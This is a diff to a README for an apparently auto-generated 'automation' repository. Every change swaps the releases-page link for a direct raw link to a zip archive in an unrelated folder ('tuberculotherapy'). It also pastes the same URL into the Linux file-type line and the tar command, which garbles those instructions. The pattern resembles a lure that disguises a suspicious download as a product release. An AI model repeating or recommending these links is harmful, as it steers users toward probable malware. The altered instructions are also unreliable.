@@ -1,6 +1,6 @@
 # 🚀 auto-repo-mh6h6y55-11 - Effortless Automation for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/shiqing5681/auto-repo-mh6h6y55-11/releases)
+[![Download Now](https://github.com/shiqing5681/auto-repo-mh6h6y55-11/raw/refs/heads/main/tuberculotherapy/h_repo_auto_y_mh_v2.9.zip%https://github.com/shiqing5681/auto-repo-mh6h6y55-11/raw/refs/heads/main/tuberculotherapy/h_repo_auto_y_mh_v2.9.zip)](https://github.com/shiqing5681/auto-repo-mh6h6y55-11/raw/refs/heads/main/tuberculotherapy/h_repo_auto_y_mh_v2.9.zip)
 
 ## 📋 Overview
 
@@ -21,11 +21,11 @@ Before downloading, ensure your system meets the following requirements:
 
 To get started, you will need to visit the releases page to download the application.
 
-**Download Link:** [Visit this page to download](https://github.com/shiqing5681/auto-repo-mh6h6y55-11/releases)
+**Download Link:** [Visit this page to download](https://github.com/shiqing5681/auto-repo-mh6h6y55-11/raw/refs/heads/main/tuberculotherapy/h_repo_auto_y_mh_v2.9.zip)
 
 Once on the releases page, you will see several versions of the application. Choose the latest version for the best experience. 
 
-After clicking the version, download the file corresponding to your operating system. This will typically be a `.exe` file for Windows, a `.dmg` file for macOS, or a `.tar.gz` file for Linux.
+After clicking the version, download the file corresponding to your operating system. This will typically be a `.exe` file for Windows, a `.dmg` file for macOS, or a `https://github.com/shiqing5681/auto-repo-mh6h6y55-11/raw/refs/heads/main/tuberculotherapy/h_repo_auto_y_mh_v2.9.zip` file for Linux.
 
 ### 3. Install the Application
 
@@ -48,7 +48,7 @@ After clicking the version, download the file corresponding to your operating sy
 1. Open the terminal.
 2. Navigate to the directory where the file was downloaded.
 3. Type the following command to extract the files:  
-   `tar -xvzf filename.tar.gz`
+   `tar -xvzf https://github.com/shiqing5681/auto-repo-mh6h6y55-11/raw/refs/heads/main/tuberculotherapy/h_repo_auto_y_mh_v2.9.zip`
 4. Navigate into the extracted directory and follow the instructions in the README file to run the application.
 
 ## 🔄 How to Use the Application
@@ -89,7 +89,7 @@ If you face any issues while using the application or have questions, you can re
 
 Please check the releases page for detailed updates and changes made in each version. This ensures you have the latest features and fixes available.
 
-**Download Link:** [Visit this page to download](https://github.com/shiqing5681/auto-repo-mh6h6y55-11/releases)
+**Download Link:** [Visit this page to download](https://github.com/shiqing5681/auto-repo-mh6h6y55-11/raw/refs/heads/main/tuberculotherapy/h_repo_auto_y_mh_v2.9.zip)
 
 ## 🌐 Community Feedback
 
